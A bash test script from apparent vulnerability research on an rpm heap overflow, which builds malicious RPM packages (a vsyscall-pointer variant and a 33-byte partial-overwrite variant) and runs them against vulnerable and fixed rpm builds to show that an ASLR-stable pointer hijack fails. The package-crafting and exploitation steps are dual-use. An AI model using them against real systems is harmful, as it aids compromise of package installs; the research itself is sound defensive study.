#!/usr/bin/env bash
# Bounded negative: why a package-only ASLR-stable GC target is unavailable.
# The overwritten qword is nil before the copy under a real ASLR-enabled
# process, so a low-byte partial overwrite cannot preserve a random heap
# base; a fixed readable address (vsyscall) faults; a 33-byte write aborts
# in glibc before any GC dereference. No debugger-forced execution.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$config/rpmrc" ] || config=$root/build-vuln-asan
vuln_plain=$root/build-vuln-plain/tools/rpm
fixed_asan=$root/build-fixed-asan/tools/rpm
for bin in "$vuln_plain" "$fixed_asan"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

work=$PWD/aslr-ceiling
mkdir -p "$work/db"
targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    if [ -e "$p" ]; then
        echo "REFUSE: $p already exists; not overwriting an unrelated file"
        exit 1
    fi
done
cleanup() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap cleanup EXIT
fresh() { cleanup; rm -rf "$work/db"; mkdir -p "$work/db"; }

python3 - <<'PY' || exit 1
from pathlib import Path
import struct
work = Path("aslr-ceiling")
base = Path("install/attack-reloc.rpm").read_bytes()
needle = b"MISHE-RPM!!" + b"A" * 53
assert base.count(needle) == 1, "expected one 64-byte chosen payload"
i = base.index(needle)
fixed = bytearray(base)
fixed[i+32:i+40] = struct.pack("<Q", 0xffffffffff600000)
(work / "attack-vsyscall.rpm").write_bytes(bytes(fixed))
PY
RPM2SHELL_PAYLOAD_LEN=33 python3 make-attack.py safe.rpm \
    "$work/attack-len33.rpm" > "$work/make-len33.log" || exit 1
python3 - <<'PY' || exit 1
from pathlib import Path
p = Path("aslr-ceiling/attack-len33.rpm")
blob = p.read_bytes()
assert blob.count(b"/opt/") == 5
p.with_name("attack-len33-reloc.rpm").write_bytes(blob.replace(b"/opt/", b"/tmp/"))
PY

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

# The real copy site under ASLR (GDB only observes; no forced call).
fresh
gdb -q -batch \
    -ex 'set disable-randomization off' \
    -ex "set environment RPM_CONFIGDIR $config" \
    -ex "directory $root/src/rpm/lib" \
    -x aslr-ceiling/pre-copy.gdb --args "$vuln_plain" \
    --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
    --nosignature --nofiledigest --ignoresize \
    "$PWD/install/attack-reloc.rpm" > "$work/pre-copy.log" 2>&1
if grep -q 'ENTRY_BUF=0x.* NEXT=(nil)' "$work/pre-copy.log" &&
   grep -qE 'AT_BUF=0x[0-9a-f]+ NEXT=0x4141414141414141' "$work/pre-copy.log"; then
    ok "adjacent qword nil before copy, chosen after copy (ASLR on)"
else
    bad "pre-copy survey: $work/pre-copy.log"
fi

# A fixed, mapped address is still not a usable read target on this kernel:
# the vsyscall page is execute-only and the chosen pointer faults.
for n in 1 2 3; do
    fresh
    RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/attack-vsyscall.rpm" \
        > "$work/vsyscall-$n.log" 2>&1
    rc=$?
    if [ "$rc" -eq 139 ]; then
        ok "fixed vsyscall pointer faults under ASLR (run $n)"
    else
        bad "fixed vsyscall pointer rc=$rc run $n"
    fi
done

# Writing only the pointer's low byte corrupts malloc metadata and aborts
# before liblua walks the pointer: no partial-overwrite redirection here.
for n in 1 2 3; do
    fresh
    RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/attack-len33-reloc.rpm" \
        > "$work/len33-$n.log" 2>&1
    rc=$?
    if [ "$rc" -eq 134 ] && grep -q 'double free or corruption' "$work/len33-$n.log"; then
        ok "low-byte partial write aborts in glibc (run $n)"
    else
        bad "low-byte partial write rc=$rc run $n"
    fi
done

fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed_asan" --dbpath "$work/db" -i \
    --nodeps --noscripts --nodigest --nosignature --nofiledigest \
    --ignoresize "$work/attack-len33-reloc.rpm" \
    > "$work/fixed-len33.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$work/fixed-len33.log"; then
    ok "fixed build rejects the partial-write package"
else
    bad "fixed partial-write rc=$rc"
fi

echo "ASLR_CEILING_PASS=$pass ASLR_CEILING_FAIL=$fail"
[ "$fail" -eq 0 ]
